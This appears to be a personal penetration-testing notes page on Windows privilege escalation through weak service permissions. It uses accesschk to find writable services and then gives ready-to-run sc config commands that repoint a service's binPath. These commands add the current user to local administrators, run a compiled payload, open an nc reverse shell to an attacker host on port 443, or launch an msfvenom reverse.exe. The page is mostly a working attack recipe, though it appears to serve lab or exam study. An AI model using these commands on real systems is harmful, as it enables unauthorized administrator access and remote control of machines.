Guide:
```
https://www.fuzzysecurity.com/tutorials/16.html
```

```
https://grimmie.net/cyberseclabs-hijack-write-up/#Drupalgeddon
```

Download old version:
```
https://xor.cat/2017/09/05/sysinternals-accesschk-accepteula
```

[[4._File Transfers#Certutil]]

#### Weak Service Permissions
Check Program Files directory recursively for writable files:
```
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

```command prompt - target
accesschk.exe /accepteula -uws "Everyone" "C:\Program Files"
```

IF YOU HAVE A USERNAME:
```
.\accesschk.exe -uwcqv %username% * -accepteula
```

![[Pasted image 20220609125204.png | 500]]

NOTE:
>The SERVICE_ALL_ACCESS permission allows any user on the system to take control of and modify the parameters of the service.

```
sc qc OpenSSHd
```

![[Pasted image 20220609125330.png | 500]]

Now we have a few options to exploit:

#### 1. Add current user to local administrators (Method 1):
```
sc config "OpenSSHd" binPath= "net localgroup administrators %username% /add"
```

```
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

[[12._ACCESSCHK#Restart the service]]

OR [[___.Misc Commands#Restart host]]

Check your user was added to local admins:

```
net localgroup administrators
```

#### 2. Add current user to local administrators (Method 2):

Open windows_service.c in a text editor and replace the command used by the system() function to (line 15): 

[[windows_service.c]]

```mousepad - kali
cmd.exe /k net localgroup administrators %username% /add
```

Exit the text editor and compile the file by typing the following in the command prompt: 

```bash - kali
x86_64-w64-mingw32-gcc windows_service.c -o x.exe 
```

(NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64')

Send to target.

[[12._ACCESSCHK#Restart the service]]
Check your user was added to local admins:

```command prompt - windows
net localgroup administrators
```

#### 3. nc reverse shell:

>SERVICE_START_NAME must say NT AUTHORITY\LocalService

![[Pasted image 20221115143853.png]]

```command prompt - target
sc config SSDPSRV binpath= "C:\WINDOWS\Temp\nc.exe -nv $KALI 443 -e C:\WINDOWS\System32\cmd.exe"
```

```
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

[[rlwrap]]

[[12._ACCESSCHK#Restart the service]]

#### 4. reverse.exe

[[1._Reverse Shells (WIN)#MSFVenom]]
```
sc config SSDPSRV binpath= "C:\WINDOWS\Temp\Tools\reverse.exe"
```

```
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

[[rlwrap]]

[[12._ACCESSCHK#Restart the service]]

#### PowerShell
Same thing in PowerShell:
```powershell - target
Get-ChildItem "C:\Program Files" -R
ecurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

![[2._Automated Tools#PowerUp ps1]]

![[Pasted image 20220207151712.png]]

#### Restart the service
IF YOU RUN INTO AN ERROR (SEE PIC)!  FOLLOW: https://sohvaxus.github.io/content/winxp-sp1-privesc.html

![[Pasted image 20220911155715.png | 1000]]

Set SSDPSRV to AUTOMATIC
NOTE: There is a space between `=` and `auto`. This is important, else the command will fail.
`sc config SSDPSRV start= auto`

Double check if it's set to AUTOMATIC (or AUTO_START)
`sc qc SSDPSRV`

```command prompt - windows
sc stop SSDPSRV
```

```command prompt - windows
sc start SSDPSRV
```

OR

```command prompt - windows
net stop SSDPSRV
```

```command prompt - windows
net start SSDPSRV
```


OR [[___.Misc Commands#Restart host]]